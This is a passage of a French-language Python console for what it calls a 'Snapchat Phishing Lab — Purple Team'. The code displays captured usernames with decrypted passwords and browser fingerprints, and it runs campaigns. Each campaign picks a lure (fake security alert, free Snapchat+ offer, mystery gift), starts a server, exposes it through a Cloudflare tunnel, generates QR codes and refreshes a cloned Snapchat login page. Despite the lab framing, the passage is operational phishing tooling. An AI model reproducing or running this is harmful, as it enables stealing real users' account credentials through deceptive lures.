        cls(); print(LOGO_RAW)
    build_status_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, participant_id, username, password, timestamp, step FROM captured_credentials ORDER BY id DESC"
    ).fetchall()
    conn.close()
    if not rows:
        warn("Aucune donnée.")
        pause()
        return

    if RICH_OK:
        tbl = Table(box=SQUARE, border_style="green", header_style="bold cyan",
                     title=f"[cyan]CREDENTIALS ({len(rows)} enregistrement(s))[/]")
        tbl.add_column("#", style="dim")
        tbl.add_column("Step", style="cyan")
        tbl.add_column("Participant")
        tbl.add_column("Username")
        tbl.add_column("Password")
        tbl.add_column("Timestamp", style="dim")
        for r in rows:
            raw = r[3] or ""
            has = bool(raw)
            plain = decrypt_password(raw) if has else ""
            pw = f"[green]{plain}[/]" if show_pw and has else ("[green]***[/]" if has else "[dim]-[/]")
            step = r[5] or "?"
            tbl.add_row(str(r[0]), f"[{'green' if has else 'dim'}]{step}[/]",
                       str(r[1] or '-')[:22], str(r[2] or '-')[:22], pw, str(r[4])[:19] if r[4] else "")
        console.print(tbl)
    else:
        print(f"\n  {C}CREDENTIALS ({len(rows)} enregistrement(s)){X}\n")
        for r in rows:
            raw = r[3] or ""
            has = bool(raw)
            plain = decrypt_password(raw) if has else ""
            pw = f"{G}{plain}{X}" if show_pw and has else (f"{G}***{X}" if has else f"{D}-{X}")
            step = r[5] or "?"
            color = G if has else D
            pid_short = str(r[1] or '-')[:22]
            user_display = str(r[2] or '-')[:22]
            print(f"  #{r[0]:<4} {color}[{step:<8}]{X} {pid_short:<22} {user_display:<22} {pw:<20} {(r[4] or '')[:19]}")
    pause()

def td_logs():
    if RICH_OK:
        console.clear()
        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
    else:
        cls(); print(LOGO_RAW)
    build_status_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, event_type, participant_id, details, timestamp FROM experiment_log ORDER BY id DESC LIMIT 40"
    ).fetchall()
    conn.close()
    if not rows:
        warn("Aucun log.")
        pause()
        return

    if RICH_OK:
        tbl = Table(box=SQUARE, border_style="cyan", header_style="bold cyan",
                     title="[cyan]LOGS (40 derniers)[/]")
        tbl.add_column("#", style="dim")
        tbl.add_column("Heure", style="dim")
        tbl.add_column("Événement")
        tbl.add_column("Participant")
        for r in rows:
            ev = r[1][:20]
            pid = str(r[2] or '-')[:18]
            ts = r[4][11:19] if r[4] else "--:--:--"
            tbl.add_row(str(r[0]), ts, ev, pid)
        console.print(tbl)
    else:
        print(f"\n  {C}LOGS ({len(rows)} derniers){X}\n")
        for r in rows:
            ev = r[1][:20]
            pid = str(r[2] or '-')[:16]
            ts = r[4][11:19] if r[4] else "--:--:--"
            print(f"  {ts} {C}{ev:<20}{X} {pid:<18} #{r[0]}")
    pause()

def td_fingerprints():
    if RICH_OK:
        console.clear()
        console.print(Align.center(Panel(Text(LOGO_RAW, style="cyan"), border_style="cyan", box=HEAVY)))
    else:
        cls(); print(LOGO_RAW)
    build_status_bar()
    conn = db()
    rows = conn.execute(
        "SELECT id, participant_id, screen_resolution, timezone, browser_language, "
        "platform, time_on_page, referrer, click_count, step "
        "FROM captured_credentials WHERE screen_resolution != '' ORDER BY id DESC"
    ).fetchall()
    conn.close()
    if not rows:
        warn("Aucune empreinte.")
        pause()
        return

    if RICH_OK:
        for r in rows:
            pid = str(r[1])[:20]
            tbl = Table(box=MINIMAL, border_style="cyan")
            tbl.add_column("Info", style="cyan")
            tbl.add_column("Valeur")
            tbl.add_row("#", str(r[0]))
            tbl.add_row("Step", f"[cyan]{r[9]}[/]")
            tbl.add_row("Participant", pid)
            tbl.add_row("Écran", str(r[2] or ''))
            tbl.add_row("Fuseau", str(r[3] or ''))
            tbl.add_row("Langue", str(r[4] or ''))
            tbl.add_row("Plateforme", str(r[5] or ''))
            tbl.add_row("Temps", f"{r[6]}s" if r[6] else '')
            tbl.add_row("Clics", str(r[8] or 0))
            if r[7]:
                tbl.add_row("Provenance", str(r[7]))
            console.print(Panel(tbl, border_style="cyan"))
    else:
        for r in rows:
            pid = str(r[1])[:20]
            print(f"  #{r[0]} [{r[9]}] {C}{pid}{X}")
            print(f"    {D}Écran :{X} {r[2]}  |  {D}Fuseau :{X} {r[3]}")
            print(f"    {D}Langue :{X} {r[4]}  |  {D}Plateforme :{X} {r[5]}")
            print(f"    {D}Temps :{X} {r[6]}s  |  {D}Clics :{X} {r[8]}")
            if r[7]: print(f"    {D}Provenance :{X} {r[7]}")
    pause()

def td_votes():
    if RICH_OK:
        console.clear()
        console.print(Align.center(Panel(Text(LOGO_RAW, style="magenta"), border_style="magenta", box=HEAVY)))
    else:
        cls(); print(LOGO_RAW)
    build_status_bar()
    conn = db()
    ctx = ssl._create_unverified_context()
    try:
        r = urllib.request.urlopen(f"{server_url()}/api/classement", context=ctx, timeout=5)
        data = json.loads(r.read())
    except Exception as e:
        panic(f"Erreur de chargement : {e}")
        pause()
        return
    votes_rows = conn.execute(
        "SELECT id, pseudo, snap_validated, created_at FROM votes_top3 ORDER BY id DESC"
    ).fetchall()
    conn.close()

    ranking = data.get('ranking', [])
    total_voters = data.get('total_voters', 0)

    if RICH_OK:
        console.print(f"\n[bold magenta]CLASSEMENT SECRET[/] — {total_voters} votant(s) validé(s)\n")
        if not ranking:
            warn("Aucun vote encore.")
        else:
            tbl = Table(box=SQUARE, border_style="magenta", header_style="bold magenta")
            tbl.add_column("#")
            tbl.add_column("Nom")
            tbl.add_column("Score")
            for i, p in enumerate(ranking):
                tbl.add_row(str(i+1), p['name'], f"[bold green]{p['score']} pts[/]")
            console.print(tbl)
        if votes_rows:
            console.print("\n[bold]Liste des votants :[/]")
            vtbl = Table(box=MINIMAL, border_style="dim")
            vtbl.add_column("#", style="dim")
            vtbl.add_column("Pseudo")
            vtbl.add_column("Statut")
            vtbl.add_column("Date", style="dim")
            for v in votes_rows:
                val = "[bold green]✓ Validé[/]" if v[2] else "[yellow]⏳ En attente[/]"
                ts = v[3][:19] if v[3] else "--"
                vtbl.add_row(str(v[0]), f"[cyan]{v[1] or '?'}[/]", val, ts)
            console.print(vtbl)
    else:
        print(f"\n  {M}CLASSEMENT SECRET — {total_voters} votant(s) validé(s){X}\n")
        if not ranking:
            print(f"  {Y}Aucun vote encore.{X}")
        else:
            td_table(["#", "Nom", "Score"],
                     [[i+1, r['name'], f"{G}{r['score']} pts{X}"] for i, r in enumerate(ranking)])
        if votes_rows:
            print(f"\n  {D}Liste des votants :{X}")
            for v in votes_rows:
                val = f"{G}✓ Validé{X}" if v[2] else f"{Y}⏳ En attente{X}"
                ts = v[3][:19] if v[3] else "--"
                print(f"  #{v[0]} {C}{v[1] or '?'}{X} — {val} ({ts})")
    pause()

# ══════════════════════════════════════════════════════════════
#  CAMPAGNE
# ══════════════════════════════════════════════════════════════

def action_campaign():
    global FLASK_USE_SSL
    scenario_id = "classement"
    server_running = False
    tunnel_url = None

    while True:
        if RICH_OK:
            console.clear()
            logo_text = Text()
            colors = ["yellow", "bright_yellow", "green", "cyan", "blue", "magenta"]
            for i, line in enumerate(LOGO_RAW.split('\n')):
                logo_text.append(line + "\n", style=colors[i % len(colors)])
            console.print(Align.center(Panel(logo_text, border_style="magenta", box=HEAVY)))
        else:
            cls()
            print(f"{Y}{LOGO_RAW}{X}")

        s_name, s_desc = {
            "classement": ("🏆 Classement Secret", "Jeu de vote anonyme"),
            "securite": ("🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
            "snapchat_plus": ("🎁 Snapchat+", "Offre Snapchat+ gratuite"),
            "cadeau": ("🎀 Cadeau Mystère", "Concours cadeau gagnant"),
        }.get(scenario_id, ("???", "???"))

        if RICH_OK:
            grid = Table.grid(padding=(1, 2))
            grid.add_column(justify="left", style="cyan")
            grid.add_column()

            grid.add_row("", "[bold magenta]🎯 LANCER UNE CAMPAGNE[/]")
            grid.add_row("", "")
            grid.add_row("[bold]ÉTAPE 1 — Choisir un appât[/]")
            grid.add_row("", f"  Scénario : [yellow]{s_name}[/]")
            grid.add_row("", f"  [dim]{s_desc}[/]")
            grid.add_row("", "")
            grid.add_row("[bold]ÉTAPE 2 — Lancer le serveur[/]")
            srv_status = "[bold green]● EN COURS[/]" if server_running else "[bold red]○ ARRÊTÉ[/]"
            grid.add_row("", f"  Statut : {srv_status}")
            if tunnel_url:
                grid.add_row("", f"  [dim]URL : {tunnel_url}[/]")
            grid.add_row("", "")
            grid.add_row("[bold]ÉTAPE 3 — Générer les outils[/]")
            grid.add_row("", "  [dim]QR code, Liens, Refresh page Snapchat[/]")
            grid.add_row("", "")
            grid.add_row("[bold]ÉTAPE 4 — Surveillance[/]")
            grid.add_row("", "  [dim]Watch Live, Dashboard[/]")
            grid.add_row("", "")
            grid.add_row("───", "────────────")
            grid.add_row("", "")
            grid.add_row("[green][1][/]", "Changer de scénario")
            grid.add_row("[green][2][/]", "Démarrer le serveur")
            if server_running:
                grid.add_row("[green][3][/]", "+ Tunnel Cloudflare")
                grid.add_row("[green][4][/]", "Générer un QR code")
                grid.add_row("[green][R][/]", "Refresh page Snapchat (clone)")
                grid.add_row("[green][5][/]", "Watch Live")
                grid.add_row("[green][6][/]", "Dashboard")
                grid.add_row("[green][7][/]", "Ouvrir dans le navigateur")
            grid.add_row("[green][10][/]", "Gestion automatisée des campagnes")
            grid.add_row("[red][9][/]", "Arrêter le serveur")
            grid.add_row("[dim][0][/]", "[dim]Retour au menu principal[/]")
            console.print(Panel(grid, border_style="magenta", box=ROUNDED))
            c = Prompt.ask("[bold green]└─>[/]", default="").strip()
        else:
            print(f"  {D}{'─' * 60}{X}")
            print(f"  {M}  🎯 LANCER UNE CAMPAGNE{X}")
            print(f"  {D}{'─' * 60}{X}")
            print()
            server_status = f"{G}● EN COURS{X}" if server_running else f"{R}○ ARRÊTÉ{X}"
            print(f"  {C}ÉTAPE 1 — Choisir un appât{X}")
            print(f"    Scénario actuel : {Y}{s_name}{X}")
            print(f"    {D}{s_desc}{X}")
            print()
            print(f"  {C}ÉTAPE 2 — Lancer le serveur{X}")
            print(f"    Statut : {server_status}")
            if tunnel_url:
                print(f"    {D}URL : {tunnel_url}{X}")
            print()
            print(f"  {C}ÉTAPE 3 — Générer les outils{X}")
            print(f"    {D}QR code, Liens, Refresh page Snapchat{X}")
            print()
            print(f"  {C}ÉTAPE 4 — Surveillance{X}")
            print(f"    {D}Watch Live, Dashboard{X}")
            print()
            print(f"  {D}{'─' * 60}{X}\n")
            print(f"    {G}[1]{X}  Changer de scénario")
            print(f"    {G}[2]{X}  Démarrer le serveur")
            if server_running:
                print(f"    {G}[3]{X}  + Tunnel Cloudflare")
                print(f"    {G}[4]{X}  Générer un QR code")
                print(f"    {G}[R]{X}  Refresh page Snapchat (clone)")
                print(f"    {G}[5]{X}  Watch Live")
                print(f"    {G}[6]{X}  Dashboard")
                print(f"    {G}[7]{X}  Ouvrir dans le navigateur")
            print(f"    {G}[10]{X}  Gestion automatisée des campagnes")
            print(f"    {R}[9]{X}  Arrêter le serveur")
            print(f"    {D}[0]{X}  Retour au menu principal")
            print()
            c = input(f"  {G}└─>{X} ").strip()

        if c == "1":
            if RICH_OK:
                console.clear()
            else:
                cls()
            scenarios = [
                ("classement", "🏆 Classement Secret", "Jeu de vote anonyme"),
                ("securite", "🔐 Alerte de sécurité", "Fausse alerte Snapchat"),
                ("snapchat_plus", "🎁 Snapchat+", "Offre Snapchat+ gratuite"),
                ("cadeau", "🎀 Cadeau Mystère", "Concours cadeau gagnant"),
            ]
            if RICH_OK:
                sg = Table.grid(padding=(1, 2))
                sg.add_column(justify="left", style="cyan")
                sg.add_column()
                sg.add_row("", "[bold white]CHOISIR UN SCÉNARIO[/]")
                sg.add_row("", "")
                for i, (sid, sn, sd) in enumerate(scenarios, 1):
                    m = "◄" if sid == scenario_id else " "
                    sg.add_row(f"[green][{i}][/]", f"{m} {sn}")
                    sg.add_row("", f"  [dim]{sd}[/]")
                    if i < len(scenarios):
                        sg.add_row("", "")
                console.print(Panel(sg, border_style="green", box=ROUNDED))
                choix = Prompt.ask("[bold green]└─>[/]", default="").strip()
            else:
                for i, (sid, sn, sd) in enumerate(scenarios, 1):
                    m = "◄" if sid == scenario_id else " "
                    print(f"    {G}[{i}]{X} {m} {sn}")
                    print(f"       {D}{sd}{X}")
                print()
                choix = input(f"  {G}└─>{X} ").strip()
            mapping = {"1": "classement", "2": "securite", "3": "snapchat_plus", "4": "cadeau"}
            if choix in mapping:
                scenario_id = mapping[choix]
                okay(f"Scénario changé : {scenarios[int(choix)-1][1]}")
            pause()

        elif c == "2":
            stop_tunnel()
            if is_server_running():
                stop_server()
                time.sleep(0.5)
            FLASK_USE_SSL = True
            if not start_server():
                panic("Échec du démarrage")
                pause()
                continue
            server_running = True
            base = server_url()
            okay(f"Serveur démarré sur {base}")
            info(f"URL scénario : {base}/scenario/{scenario_id}")
            pause()

        elif c == "3" and server_running:
            stop_server()
            time.sleep(1)
            FLASK_USE_SSL = False
            start_server()
            tunnel_url = start_tunnel()
            if tunnel_url:
                okay(f"Tunnel actif : [link={tunnel_url}]{tunnel_url}[/]")
                info(f"URL campagne : {tunnel_url}/scenario/{scenario_id}")
            else:
                panic("Tunnel échoué")
            pause()

        elif c == "4" and server_running:
            base_url = tunnel_url or server_url()
            campagne_url = f"{base_url}/scenario/{scenario_id}"
            with _spinner("Generation du QR code..."):
                try:
                    from tools.qr_generator import make_styled_qr
                    filepath = make_styled_qr(campagne_url, "snapchat")
                    okay(f"QR code genere : {filepath}")
                    info(f"Contient : {campagne_url}")
                    if os.name == "nt":
                        os.startfile(os.path.dirname(filepath))
                except ImportError:
                    panic("qrcode[pil] non installe. Installation...")
                    import subprocess, sys
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "qrcode[pil]"])
                    from tools.qr_generator import make_styled_qr
                    filepath = make_styled_qr(campagne_url, "snapchat")
                    okay(f"QR code genere : {filepath}")
                except Exception as e:
                    panic(f"Erreur : {e}")
            pause()

        elif c.lower() == "r":
            with _spinner("Telechargement de la page Snapchat..."):
                try:
                    sys.path.insert(0, os.path.join(BASE, "tools"))
                    from refresh_snapchat import main as refresh_page
                    refresh_page()
                    okay("Page Snapchat mise a jour !")
                except ImportError:
                    panic("Playwright non installe. Installation...")
                    import subprocess, sys
                    subprocess.check_call([sys.executable, "-m", "pip", "install", "playwright"])
                    subprocess.check_call([sys.executable, "-m", "playwright", "install", "chromium"])
                    from refresh_snapchat import main as refresh_page
                    refresh_page()
                    okay("Page Snapchat mise a jour !")
                except Exception as e:
                    panic(f"Erreur : {e}")
            pause()

        elif c == "10" and server_running:
            try:
                from campaign_manager import init_campaign_db, interactive_menu as cm_menu
                init_campaign_db()
                cm_menu()
            except ImportError as e:
                panic(f"campaign_manager non trouvé : {e}")
            except Exception as e:
                panic(f"Erreur : {e}")
            pause()

        elif c == "5" and server_running:
            watch_live()
        elif c == "6" and server_running:
            terminal_dashboard()
        elif c == "7" and server_running:
            base_url = tunnel_url or server_url()
            url = f"{base_url}/scenario/{scenario_id}"
            webbrowser.open(url)
            okay(f"Ouverture : {url}")
            pause()
        elif c == "9":
            stop_tunnel()
            stop_server()
            server_running = False
            tunnel_url = None
            info("Serveur arrêté.")
            pause()
        elif c == "0":
            return

# ══════════════════════════════════════════════════════════════
#  MAIN LOOP
# ══════════════════════════════════════════════════════════════

def main():
    while True:
        show_logo()
        build_status_bar()
        c = show_menu_rich() if RICH_OK else show_menu_fallback()

        if c == "1":
            action_1_start()
        elif c == "2":
            action_2_tunnel()
        elif c == "3":
            action_3_dashboard()
        elif c == "4":
            action_4_watch()
        elif c == "5":
            action_campaign()
        elif c == "6":
            action_5_export()
        elif c == "7":
            action_6_browser()
        elif c == "8":
            action_7_dbcheck()
        elif c == "9":
            action_8_reset()
        elif c == "0":
            stop_tunnel()
            stop_server()
            if RICH_OK:
                console.clear()
                console.print(Align.center(Panel(
                    "[bold red]Au revoir boss ![/]\n\n[dim]Snapchat Phishing Lab — Purple Team[/]",
                    border_style="red", box=HEAVY
                )))
                time.sleep(1.5)
            else:
                cls()
                print()
                print(f"{Y}{LOGO_RAW}{X}")
                print()
                print(f"  {R}Au revoir boss !{X}")
                print()
            break

if __name__ == "__main__":
    main()
